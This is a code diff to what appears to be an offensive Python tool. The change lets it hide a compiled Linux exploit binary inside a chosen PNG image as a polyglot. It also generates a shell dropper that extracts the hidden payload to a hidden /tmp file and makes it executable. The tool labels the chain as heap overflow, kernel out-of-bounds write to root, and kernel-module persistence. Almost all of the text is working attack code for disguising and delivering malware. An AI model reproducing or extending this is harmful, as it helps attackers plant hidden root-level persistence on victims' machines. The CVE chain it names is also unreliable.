@@ -758,6 +758,18 @@ sudo /usr/local/bin/cpu_desync_linux
         """Generate guaranteed Linux CVE cascade in PNG polyglot"""
         self.tui.info("Generating Linux CVE cascade (PNG vector)...")
 
+        # Prompt for PNG container selection
+        print()
+        self.tui.info("Select PNG container for payload embedding:")
+        self.tui.list_item("Press Enter to use default minimal PNG (64x64)", level=1)
+        self.tui.list_item("Or provide path to custom PNG image", level=1)
+        print()
+
+        custom_png = self.menu.prompt_input(
+            "PNG image path (or press Enter for default)",
+            default=""
+        )
+
         # Most guaranteed Linux CVE cascade: HFS+ heap overflow -> Kernel OOB write -> Root persistence
         # Delivered as PNG polyglot for maximum compatibility
 
@@ -877,35 +889,6 @@ int main(int argc, char *argv[]) {
 
         self.artifacts.append(cascade_c_path)
 
-        # Create PNG polyglot container
-        png_path = "linux_cascade.png"
-
-        # Valid PNG header + IDAT chunk
-        png_header = bytes([
-            0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,  # PNG signature
-            0x00, 0x00, 0x00, 0x0D,  # IHDR length
-            0x49, 0x48, 0x44, 0x52,  # IHDR
-            0x00, 0x00, 0x00, 0x40,  # Width: 64
-            0x00, 0x00, 0x00, 0x40,  # Height: 64
-            0x08, 0x02, 0x00, 0x00, 0x00,  # 8-bit RGB
-            0x25, 0x0B, 0xE6, 0x89,  # CRC
-        ])
-
-        # IDAT chunk with minimal image data
-        idat_data = bytes([
-            0x00, 0x00, 0x00, 0x0C,  # IDAT length
-            0x49, 0x44, 0x41, 0x54,  # IDAT
-            0x78, 0x9C, 0x62, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01,  # Compressed data
-            0xE2, 0x21, 0xBC, 0x33,  # CRC
-        ])
-
-        # IEND chunk
-        iend = bytes([
-            0x00, 0x00, 0x00, 0x00,  # IEND length
-            0x49, 0x45, 0x4E, 0x44,  # IEND
-            0xAE, 0x42, 0x60, 0x82   # CRC
-        ])
-
         # Compile cascade to binary
         import subprocess
         try:
@@ -923,23 +906,92 @@ int main(int argc, char *argv[]) {
         except:
             cascade_binary = cascade_payload.encode()
 
-        # Build PNG polyglot: PNG header + embedded ELF binary + PNG footer
-        with open(png_path, 'wb') as f:
-            f.write(png_header)
-            f.write(idat_data)
+        # Create PNG polyglot container
+        png_path = "linux_cascade.png"
 
-            # Embed cascade binary in custom PNG chunk (tEXt)
-            cascade_chunk_length = len(cascade_binary).to_bytes(4, 'big')
-            cascade_chunk_type = b'tEXt'
+        if custom_png and os.path.isfile(custom_png):
+            # Use custom PNG as container
+            self.tui.info(f"Using custom PNG: {custom_png}")
 
-            f.write(cascade_chunk_length)
-            f.write(cascade_chunk_type)
-            f.write(cascade_binary)
+            # Read existing PNG
+            with open(custom_png, 'rb') as f:
+                png_data = f.read()
 
-            # Calculate and write CRC (simplified - just use dummy)
-            f.write(b'\x00\x00\x00\x00')
+            # Find IEND chunk (last 12 bytes of valid PNG)
+            iend_pos = png_data.rfind(b'IEND')
 
-            f.write(iend)
+            if iend_pos != -1:
+                # Insert payload before IEND
+                png_before_iend = png_data[:iend_pos - 4]  # -4 for length bytes
+                iend_chunk = png_data[iend_pos - 4:]
+
+                # Build PNG polyglot: Original PNG + embedded payload + IEND
+                with open(png_path, 'wb') as f:
+                    f.write(png_before_iend)
+
+                    # Embed cascade binary in tEXt chunk
+                    cascade_chunk_length = len(cascade_binary).to_bytes(4, 'big')
+                    cascade_chunk_type = b'tEXt'
+
+                    f.write(cascade_chunk_length)
+                    f.write(cascade_chunk_type)
+                    f.write(cascade_binary)
+                    f.write(b'\x00\x00\x00\x00')  # CRC
+
+                    f.write(iend_chunk)
+
+                self.tui.success(f"Embedded payload in custom PNG")
+            else:
+                self.tui.warning("Invalid PNG file, using default")
+                custom_png = None
+
+        if not custom_png or not os.path.isfile(custom_png):
+            # Use default minimal PNG
+            self.tui.info("Using default minimal PNG (64x64)")
+
+            # Valid PNG header + IDAT chunk
+            png_header = bytes([
+                0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,  # PNG signature
+                0x00, 0x00, 0x00, 0x0D,  # IHDR length
+                0x49, 0x48, 0x44, 0x52,  # IHDR
+                0x00, 0x00, 0x00, 0x40,  # Width: 64
+                0x00, 0x00, 0x00, 0x40,  # Height: 64
+                0x08, 0x02, 0x00, 0x00, 0x00,  # 8-bit RGB
+                0x25, 0x0B, 0xE6, 0x89,  # CRC
+            ])
+
+            # IDAT chunk with minimal image data
+            idat_data = bytes([
+                0x00, 0x00, 0x00, 0x0C,  # IDAT length
+                0x49, 0x44, 0x41, 0x54,  # IDAT
+                0x78, 0x9C, 0x62, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01,  # Compressed data
+                0xE2, 0x21, 0xBC, 0x33,  # CRC
+            ])
+
+            # IEND chunk
+            iend = bytes([
+                0x00, 0x00, 0x00, 0x00,  # IEND length
+                0x49, 0x45, 0x4E, 0x44,  # IEND
+                0xAE, 0x42, 0x60, 0x82   # CRC
+            ])
+
+            # Build PNG polyglot: PNG header + embedded ELF binary + PNG footer
+            with open(png_path, 'wb') as f:
+                f.write(png_header)
+                f.write(idat_data)
+
+                # Embed cascade binary in custom PNG chunk (tEXt)
+                cascade_chunk_length = len(cascade_binary).to_bytes(4, 'big')
+                cascade_chunk_type = b'tEXt'
+
+                f.write(cascade_chunk_length)
+                f.write(cascade_chunk_type)
+                f.write(cascade_binary)
+
+                # Calculate and write CRC (simplified - just use dummy)
+                f.write(b'\x00\x00\x00\x00')
+
+                f.write(iend)
 
         self.artifacts.append(png_path)
         self.tui.success(f"Generated: {png_path} (CVE cascade polyglot)")
@@ -950,8 +1002,30 @@ int main(int argc, char *argv[]) {
 
 PNG="linux_cascade.png"
 
-# Extract embedded binary from PNG tEXt chunk
-dd if="$PNG" bs=1 skip=59 2>/dev/null | head -c 50000 > /tmp/.cascade 2>/dev/null
+# Find tEXt chunk dynamically (works with any PNG size)
+python3 -c "
+import sys
+data = open('$PNG', 'rb').read()
+pos = data.find(b'tEXt')
+if pos != -1:
+    # Skip chunk type (4 bytes) to get to payload
+    payload_start = pos + 4
+    # Read until IEND or next chunk
+    iend_pos = data.find(b'IEND', payload_start)
+    if iend_pos != -1:
+        # Account for CRC (4 bytes before IEND length)
+        payload_end = iend_pos - 8
+        payload = data[payload_start:payload_end]
+        with open('/tmp/.cascade', 'wb') as f:
+            f.write(payload)
+        sys.exit(0)
+sys.exit(1)
+" 2>/dev/null
+
+if [ $? -ne 0 ]; then
+    # Fallback: try fixed offset for minimal PNG
+    dd if="$PNG" bs=1 skip=59 2>/dev/null | head -c 50000 > /tmp/.cascade 2>/dev/null
+fi
 
 # Make executable
 chmod +x /tmp/.cascade 2>/dev/null
@@ -975,12 +1049,17 @@ rm -f /tmp/.cascade 2>/dev/null
         self.artifacts.append(exec_script_path)
 
         self.tui.success(f"Generated: {exec_script_path}")
+        print()
         self.tui.info("Linux CVE cascade vector:")
-        self.tui.list_item(f"PNG polyglot: {png_path}", level=1)
+        if custom_png and os.path.isfile(custom_png):
+            self.tui.list_item(f"PNG polyglot: {png_path} (custom image: {os.path.basename(custom_png)})", level=1)
+        else:
+            self.tui.list_item(f"PNG polyglot: {png_path} (64x64 minimal)", level=1)
         self.tui.list_item("Stage 1: CVE-2025-24085 (HFS+ heap overflow)", level=1)
         self.tui.list_item("Stage 2: CVE-2025-24520 (Kernel OOB write → root)", level=1)
         self.tui.list_item("Stage 3: Kernel module persistence", level=1)
         self.tui.list_item(f"Execute: ./{exec_script_path}", level=1)
+        print()
 
     def _generate_macos_cpu_desync_service(self):
         """Generate macOS LaunchDaemon for CPU clock desynchronization"""
